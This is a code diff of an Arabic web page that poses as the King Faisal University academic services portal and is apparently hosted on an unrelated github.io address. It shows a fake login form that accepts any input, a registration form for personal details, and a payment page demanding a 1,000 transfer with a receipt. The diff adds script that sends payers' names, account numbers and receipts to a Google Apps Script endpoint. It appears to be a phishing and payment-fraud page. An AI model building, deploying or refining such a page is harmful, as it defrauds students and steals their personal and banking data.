@@ -4,15 +4,11 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>بوابة الخدمات الأكاديمية - جامعة الملك فيصل</title>
-
-<!-- OG Tags للعرض الرسمي -->
 <meta property="og:title" content="جامعة الملك فيصل – بوابة الخدمات الأكاديمية">
-<meta property="og:description" content="التقديم الإلكتروني – تسجيل الدخول – الخدمات الأكاديمية للطلاب. يرجى تعبئة جميع الحقول بدقة وإرفاق الملفات المطلوبة.">
+<meta property="og:description" content="التقديم الإلكتروني – تسجيل الدخول – الخدمات الأكاديمية للطلاب">
 <meta property="og:image" content="https://i.postimg.cc/VLtqHrYr/images-6.jpg">
 <meta property="og:type" content="website">
-<meta property="og:url" content="https://pnu-admissions.github.io/ksu.edu.saa/">
 <meta name="twitter:card" content="summary_large_image">
-
 <link rel="icon" type="image/png" href="kfu_logo.png">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
@@ -63,7 +59,6 @@ textarea{resize:vertical;}
 @media(max-width:900px){.grid2{grid-template-columns:1fr;}}
 </style>
 </head>
-
 <body>
 
 <div class="login-container">
@@ -88,7 +83,7 @@ textarea{resize:vertical;}
 <div class="quick-access">
 <h3>وصول سريع</h3>
 <div class="quick-links">
-<a href="#" class="quick-link" onclick="showForm()">
+<a href="#" class="quick-link" id="openFormBtn">
 <i class="fas fa-user-graduate"></i> تقديم طلب جديد
 </a>
 </div>
@@ -107,7 +102,6 @@ textarea{resize:vertical;}
 </header>
 
 <div class="grid2">
-<!-- نسخ كامل الحقول كما في كودك السابق -->
 <div>
 <label>الاسم الكامل *</label><input type="text" name="fullName" required>
 <label>الجنس *</label><select name="gender" required><option value="">اختر...</option><option>ذكر</option><option>أنثى</option></select>
@@ -169,12 +163,9 @@ textarea{resize:vertical;}
 <div class="payment-section" id="paymentSection">
 <h2>صفحة السداد</h2>
 <label>اسم المحول:</label><input type="text" id="payerName" required>
-<label>رقم حساب المحول:</label>
-<div style="display:flex;align-items:center;">
-<input type="text" id="payerAccount" value="SA3380000984608016472540" readonly>
-<button class="copy-btn" onclick="copyAccount()">نسخ</button>
-</div>
+<label>رقم حساب المحول:</label><input type="text" id="payerAccount" placeholder="أدخل رقم حسابك">
 <label>اسم البنك:</label><input type="text" value="الراجحي" readonly>
+<button class="copy-btn" onclick="copyAccount()">نسخ</button>
 <label>تاريخ العملية:</label><input type="date" id="paymentDate" required>
 <label>المبلغ المحول:</label><input type="number" id="amount" value="1000" readonly>
 <label>رفع إيصال الدفع:</label><input type="file" id="receiptFile" required>
@@ -191,15 +182,74 @@ textarea{resize:vertical;}
 
 <script>
 let hasSubmitted=false;
-function showForm(){document.getElementById('registrationForm').style.display='block';}
+let hasPaid=false;
+
+function showForm(){
+document.getElementById('registrationForm').style.display='block';
+document.getElementById('openFormBtn').style.pointerEvents='none';
+}
+
 function copyAccount(){
 let copyText=document.getElementById('payerAccount');
-copyText.select();copyText.setSelectionRange(0,99999);
-document.execCommand('copy');showToast('✅ تم نسخ رقم الحساب');}
-function showToast(msg){const toast=document.getElementById('toast');toast.textContent=msg;toast.classList.add('show');setTimeout(()=>toast.classList.remove('show'),2500);}
-document.getElementById('loginForm').addEventListener('submit',function(e){e.preventDefault();const user=document.getElementById('username').value.trim();const pass=document.getElementById('password').value.trim();if(!user || !pass){showToast('❌ يرجى ملء اسم المستخدم وكلمة المرور');return;}showToast('✅ تم تسجيل الدخول');});
-document.getElementById('registrationFormForm').addEventListener('submit',function(e){e.preventDefault();if(hasSubmitted){showToast('❌ لقد تم إرسال بياناتك مسبقاً'); return;}const formData=new FormData(this);fetch(this.action,{method:'POST',body:formData}).then(res=>{if(res.ok){showToast('✅ تم إرسال بياناتك بنجاح');document.getElementById('registrationForm').style.display='none';document.getElementById('paymentSection').style.display='block';hasSubmitted=true;}else showToast('❌ حدث خطأ حاول لاحقاً');}).catch(()=>showToast('❌ فشل الاتصال'));});
-document.getElementById('submitPayment').addEventListener('click',function(){const payerName=document.getElementById('payerName').value.trim();const payerAccount=document.getElementById('payerAccount').value.trim();const paymentDate=document.getElementById('paymentDate').value;const amount=document.getElementById('amount').value.trim();const receiptFile=document.getElementById('receiptFile').files[0];if(!payerName||!payerAccount||!paymentDate||!amount||!receiptFile){showToast('❌ يرجى ملء جميع الحقول وإرفاق الإيصال');return;}showToast('✅ تم إرسال السداد بنجاح');document.getElementById('paymentSection').style.display='none';document.getElementById('successMessage').style.display='block';});
+copyText.select();
+copyText.setSelectionRange(0,99999);
+document.execCommand('copy');
+showToast('✅ تم نسخ رقم الحساب');
+}
+
+function showToast(msg){
+const toast=document.getElementById('toast');
+toast.textContent=msg;
+toast.classList.add('show');
+setTimeout(()=>toast.classList.remove('show'),2500);
+}
+
+document.getElementById('loginForm').addEventListener('submit',function(e){
+e.preventDefault();
+const user=document.getElementById('username').value.trim();
+const pass=document.getElementById('password').value.trim();
+if(!user || !pass){showToast('❌ يرجى ملء اسم المستخدم وكلمة المرور');return;}
+showToast('✅ تم تسجيل الدخول');
+});
+
+document.getElementById('registrationFormForm').addEventListener('submit',function(e){
+e.preventDefault();
+if(hasSubmitted){showToast('❌ لقد تم إرسال بياناتك مسبقاً'); return;}
+const formData=new FormData(this);
+fetch(this.action,{method:'POST',body:formData})
+.then(res=>{if(res.ok){
+showToast('✅ تم إرسال بياناتك بنجاح');
+document.getElementById('registrationForm').style.display='none';
+document.getElementById('paymentSection').style.display='block';
+hasSubmitted=true;
+}else showToast('❌ حدث خطأ حاول لاحقاً');
+}).catch(()=>showToast('❌ فشل الاتصال'));
+});
+
+document.getElementById('submitPayment').addEventListener('click',function(){
+if(hasPaid){showToast('❌ لقد تم إرسال السداد مسبقاً'); return;}
+const payerName=document.getElementById('payerName').value.trim();
+const payerAccount=document.getElementById('payerAccount').value.trim();
+const paymentDate=document.getElementById('paymentDate').value;
+const amount=document.getElementById('amount').value.trim();
+const receiptFile=document.getElementById('receiptFile').files[0];
+if(!payerName||!payerAccount||!paymentDate||!amount||!receiptFile){showToast('❌ يرجى ملء جميع الحقول وإرفاق الإيصال');return;}
+const paymentData=new FormData();
+paymentData.append("payerName",payerName);
+paymentData.append("payerAccount",payerAccount);
+paymentData.append("paymentDate",paymentDate);
+paymentData.append("amount",amount);
+paymentData.append("receiptFile",receiptFile);
+fetch("https://script.google.com/macros/s/AKfycbxglQ_oGCF_ICL56X9dofD56F1mF89vIef6NrN7BObysCTEs5xQVfQ9wGc8N4aWwkG2/exec",
+{method:"POST",body:paymentData})
+.then(res=>{if(res.ok){
+showToast('✅ تم إرسال السداد بنجاح');
+document.getElementById('paymentSection').style.display='none';
+document.getElementById('successMessage').style.display='block';
+hasPaid=true;
+}else showToast('❌ حدث خطأ حاول لاحقاً');
+}).catch(()=>showToast('❌ فشل الاتصال'));
+});
 </script>
 
 </body>
